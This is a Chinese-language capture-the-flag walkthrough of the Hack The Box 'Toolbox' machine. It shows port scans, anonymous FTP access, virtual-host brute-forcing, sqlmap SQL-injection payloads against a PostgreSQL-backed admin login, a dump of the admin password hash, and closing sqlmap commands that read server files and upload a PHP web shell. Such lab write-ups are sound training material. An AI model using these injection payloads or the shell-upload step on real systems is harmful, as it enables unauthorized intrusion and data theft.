# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责


# 服务探测
```
┌──(root💀kali)-[~/htb/Toolbox]
└─# nmap -p- 10.10.10.236 --open                                          
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-26 21:02 EST
Nmap scan report for 10.10.10.236
Host is up (0.25s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 81.26 seconds
                                                                                                                    
┌──(root💀kali)-[~/htb/Toolbox]
└─# nmap -sV -Pn 10.10.10.236 -p 21,22,135,139,443,445,5985,47001,49664,49665,49666,49667,49668,49669
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-26 21:04 EST
Nmap scan report for 10.10.10.236
Host is up (0.25s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  tcpwrapped
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.19 seconds

```

## ftp

可以匿名登录
```
┌──(root💀kali)-[~/htb/Toolbox]
└─# ftp 10.10.10.236  
Connected to 10.10.10.236.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (10.10.10.236:root): anonymous
331 Password required for anonymous
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||59847|)
150 Opening data channel for directory listing of "/"
-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe

```

docker-toolbox是windows下的docker工具，说明这台靶机可能是一个docker镜像。


# web

80端口整个看起来就像一个静态网站


把megalogistic.com写到hosts文件
```echo "10.10.10.236   megalogistic.com">> /etc/hosts```


gobuster爆破vhosts
```
┌──(root💀kali)-[~/htb/Toolbox]
└─# gobuster vhost -u https://megalogistic.com -k -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 40 --no-error

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          https://megalogistic.com
[+] Method:       GET
[+] Threads:      40
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/01/27 00:37:18 Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.megalogistic.com (Status: 200) [Size: 889]

```


或者用wfuzz
```
┌──(root💀kali)-[~/htb/Toolbox]
└─# wfuzz -u https://10.10.10.236 -H "Host: FUZZ.megalogistic.com" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hh 22357
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.10.236/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000000024:   200        35 L     83 W       889 Ch      "admin" 
```


把```admin.megalogistic.com```也加到hosts文件后，打开浏览器显示一个登录入口，burp截断登录请求测试发现可能存在sql注入


用sqlmap跑了一遍显示靶机的数据库是PostgreSQL,可以使用以下4种注入技术

```
sqlmap identified the following injection point(s) with a total of 164 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-9328' OR 5360=5360-- rFOM&password=admin

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: username=admin#' AND 4213=CAST((CHR(113)||CHR(98)||CHR(122)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (4213=4213) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(98)||CHR(98)||CHR(113)) AS NUMERIC)-- uJOK&password=admin

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: username=admin#';SELECT PG_SLEEP(5)--&password=admin

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: username=admin#' AND 5607=(SELECT 5607 FROM PG_SLEEP(5))-- UduU&password=admin
---
[00:53:58] [INFO] the back-end DBMS is PostgreSQL

```

使用基于错误的注入技术

拿到数据库名：
```
sqlmap -r data --batch --dbms=PostgreSQL --force-ssl --technique E --no-cast --threads 4 --dbs

available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public

```

表：
```
sqlmap -r data --batch --dbms=PostgreSQL --force-ssl --technique E --no-cast --threads 4 -D public --tables
Database: public
[1 table]
+-------+
| users |
+-------+
```

数据
```
sqlmap -r data --batch --dbms=PostgreSQL --force-ssl --technique E --no-cast --threads 4 -D public -T users --dump

Table: users
[1 entry]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| 4a100a85cb5ca3616dcf137918550815 | admin    |
+----------------------------------+----------+
```

但是这个md5数据无法破解。
但是我们既然已经知道了username存在sql注入，那么可以用上面sqlmap跑出来的payload登录页面

> admin：admin#';SELECT PG_SLEEP(5)--
> passwd：随便

```

```

sqlmap -r data --batch --dbms=PostgreSQL --force-ssl  --no-cast --threads 4  --file-read "/var/www/admin/info.php"



sqlmap -r data --batch --dbms=PostgreSQL --force-ssl  --no-cast --threads 4   --file-write "/root/htb/Toolbox/shell.php"  --file-dest "/var/www/shell.php"
